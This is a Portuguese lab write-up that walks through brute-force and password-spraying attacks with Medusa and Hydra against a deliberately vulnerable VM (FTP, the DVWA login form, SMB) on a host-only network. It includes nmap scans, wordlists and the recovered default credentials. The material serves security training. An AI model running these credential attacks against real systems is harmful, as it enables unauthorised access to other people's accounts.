## 0\. Reconhecimento

```bash
# Descobrir IP do Kali
ip a

# Varredura de portas e serviços no alvo
nmap -sV -p- 192.168.56.20
```

**Saída esperada (resumo):** portas 21/tcp (FTP), 80/tcp (Apache/DVWA), 139/tcp e 445/tcp (Samba) abertas.

\---

## 1\. Wordlists simples

```bash
mkdir -p \~/forca-bruta-medusa/wordlists
cd \~/forca-bruta-medusa/wordlists

cat > users.txt << EOF
admin
msfadmin
root
user
test
EOF

cat > passwords.txt << EOF
admin
123456
msfadmin
password
toor
EOF
```

\---

## 2\. Força bruta em FTP

```bash
medusa -h 192.168.56.20 -U users.txt -P passwords.txt -M ftp
```

**Resultado:**

```
ACCOUNT FOUND: \[ftp] Host: 192.168.56.20 User: msfadmin Password: msfadmin \[SUCCESS]
```

**Validação manual:**

```bash
ftp 192.168.56.20
# Usuário: msfadmin / Senha: msfadmin -> login confirmado
```

\---

## 3\. Automação no formulário de login do DVWA (HTTP)

### 3.1 Preparação

Com o navegador (ou Burp Suite), inspecione o formulário de login do DVWA (`/dvwa/login.php`) e identifique os campos (`username`, `password`, `Login`) e a mensagem exibida em caso de falha (ex: "Login failed").

### 3.2 Tentativa com Medusa (módulo http)

```bash
medusa -h 192.168.56.20 -U users.txt -P passwords.txt -M http \\
  -m DIR:/dvwa/login.php \\
  -m FORM:"username=^USER^\&password=^PASS^\&Login=Login" \\
  -m DENY\_SIGNAL:"login.php"
```

### 3.3 Alternativa com Hydra (usada por maior estabilidade do módulo HTTP-FORM)

```bash
hydra -L users.txt -P passwords.txt 192.168.56.20 http-form-post \\
  "/dvwa/login.php:username=^USER^\&password=^PASS^\&Login=Login:F=Login failed"
```

**Resultado:**

```
\[80]\[http-post-form] host: 192.168.56.20   login: admin   password: password
```

**Validação manual:** login efetuado no navegador com `admin:password`, print salvo em `evidencias/dvwa-login-sucesso.png`.

\---

## 4\. Enumeração de usuários SMB + Password Spraying

### 4.1 Enumeração

```bash
enum4linux -a 192.168.56.20
# ou, para listar compartilhamentos
smbclient -L //192.168.56.20 -N
```

**Usuários identificados:** `msfadmin`, `user`, `service` *(ajustar conforme a saída real)*

### 4.2 Password spraying (uma senha comum contra vários usuários — evita bloqueio de conta)

```bash
medusa -h 192.168.56.20 -U users.txt -p msfadmin -M smbnt
```

**Resultado:**

```
ACCOUNT FOUND: \[smbnt] Host: 192.168.56.20 User: msfadmin Password: msfadmin \[SUCCESS]
```

**Validação manual:**

```bash
smbclient //192.168.56.20/share -U msfadmin
```

\---

## Observações metodológicas

* Em SMB optou-se por **password spraying** (1 senha x N usuários) em vez de força bruta tradicional (N senhas x 1 usuário), para refletir uma técnica mais realista e menos propensa a disparar bloqueios de conta.
* Todos os testes foram limitados à rede host-only do laboratório.

